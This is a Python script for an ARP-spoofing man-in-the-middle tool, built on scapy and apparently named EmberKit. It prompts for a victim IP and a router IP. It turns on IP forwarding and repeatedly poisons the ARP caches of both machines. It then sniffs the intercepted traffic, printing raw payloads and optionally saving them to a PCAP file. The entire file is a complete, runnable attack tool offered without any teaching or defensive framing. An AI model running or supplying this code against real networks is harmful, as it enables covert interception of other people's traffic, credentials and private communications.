import os
import time
import sys
import threading
from scapy.all import *

logo = """
 ██████████                 █████                        █████   ████  ███   █████          ██████   ██████ █████ ███████████ ██████   ██████
░░███░░░░░█                ░░███                        ░░███   ███░  ░░░   ░░███          ░░██████ ██████ ░░███ ░█░░░███░░░█░░██████ ██████ 
 ░███  █ ░  █████████████   ░███████   ██████  ████████  ░███  ███    ████  ███████   ██    ░███░█████░███  ░███ ░   ░███  ░  ░███░█████░███ 
 ░██████   ░░███░░███░░███  ░███░░███ ███░░███░░███░░███ ░███████    ░░███ ░░░███░   ░░     ░███░░███ ░███  ░███     ░███     ░███░░███ ░███ 
 ░███░░█    ░███ ░███ ░███  ░███ ░███░███████  ░███ ░░░  ░███░░███    ░███   ░███           ░███ ░░░  ░███  ░███     ░███     ░███ ░░░  ░███ 
 ░███ ░   █ ░███ ░███ ░███  ░███ ░███░███░░░   ░███      ░███ ░░███   ░███   ░███ ███       ░███      ░███  ░███     ░███     ░███      ░███ 
 ██████████ █████░███ █████ ████████ ░░██████  █████     █████ ░░████ █████  ░░█████  ██    █████     █████ █████    █████    █████     █████
░░░░░░░░░░ ░░░░░ ░░░ ░░░░░ ░░░░░░░░   ░░░░░░  ░░░░░     ░░░░░   ░░░░ ░░░░░    ░░░░░  ░░    ░░░░░     ░░░░░ ░░░░░    ░░░░░    ░░░░░     ░░░░░                                                                                                                                         
"""

def get_info():
    print("~~~ [1] Initializing Config...")
    interface = input("Enter Interface: ")
    v_ip = input("Enter Victim IP: ")
    r_ip = input("Enter Router IP: ")
    log_pcap = input("Log traffic to PCAP file? (y/n): ").lower() == 'y'
    
    bpf_filter = input("Enter BPF Filter (leave blank for all, e.g., 'tcp port 80'): ")
    
    return {
        "iface": interface, 
        "v_ip": v_ip, 
        "r_ip": r_ip, 
        "log": log_pcap,
        "filter": bpf_filter
    }

def set_ip_forwarding(toggle):
    state = "1" if toggle else "0"
    if sys.platform == "darwin":
        os.system(f'sysctl -w net.inet.ip.forwarding={state}')
    else:
        os.system(f'echo {state} > /proc/sys/net/ipv4/ip_forward')

def get_mac(ip, interface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                 timeout=2, iface=interface, inter=0.1, verbose=False)
    for _, receive in ans:
        return receive.sprintf(r"%Ether.src%")
    return None

def spoof_thread(v_ip, v_mac, r_ip, r_mac, stop_event):
    while not stop_event.is_set():
        send(ARP(op=2, pdst=v_ip, psrc=r_ip, hwdst=v_mac), verbose=False)
        send(ARP(op=2, pdst=r_ip, psrc=v_ip, hwdst=r_mac), verbose=False)
        time.sleep(2)

def sniff_callback(packet, writer):
    if packet.haslayer(IP):
        if writer:
            writer.write(packet)
            
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            print(f"[*] {packet[IP].src} -> {packet[IP].dst} | Data: {payload[:50]}")

def mitm():
    print(logo)
    time.sleep(1.5)
    conf = get_info()
    if os.geteuid() != 0:
        print("~!~ Error: Run as root.")
        sys.exit(1)

    print("~~~ [2] Resolving MAC addresses...")
    v_mac = get_mac(conf["v_ip"], conf["iface"])
    r_mac = get_mac(conf["r_ip"], conf["iface"])
    
    if not v_mac or not r_mac:
        print("~!~ Error.")
        sys.exit(1)

    set_ip_forwarding(True)
    stop_spoofing = threading.Event()
    spoof_worker = threading.Thread(target=spoof_thread, args=(conf["v_ip"], v_mac, conf["r_ip"], r_mac, stop_spoofing))
    
    writer = None
    if conf["log"]:
        filename = f"capture_{int(time.time())}.pcap"
        writer = PcapWriter(filename, append=True, sync=True)
        print(f"~~~ [3] Sending packets to {filename}...")

    try:
        spoof_worker.start()
        print(f"~~~ [4] MITM Running. Filtering for: '{conf['filter'] if conf['filter'] else 'all'}'")
        sniff(iface=conf["iface"], 
              filter=conf["filter"],
              prn=lambda pkt: sniff_callback(pkt, writer), 
              store=0)
        
    except KeyboardInterrupt:
        print("\n~~~ [!] Shutting down...")
        stop_spoofing.set()
        spoof_worker.join()
        
        if writer:
            writer.close()
        send(ARP(op=2, pdst=conf["r_ip"], psrc=conf["v_ip"], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=v_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=conf["v_ip"], psrc=conf["r_ip"], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=r_mac), count=5, verbose=False)
        set_ip_forwarding(False)
        print("~~~ [5] Clean Exit Successful.")
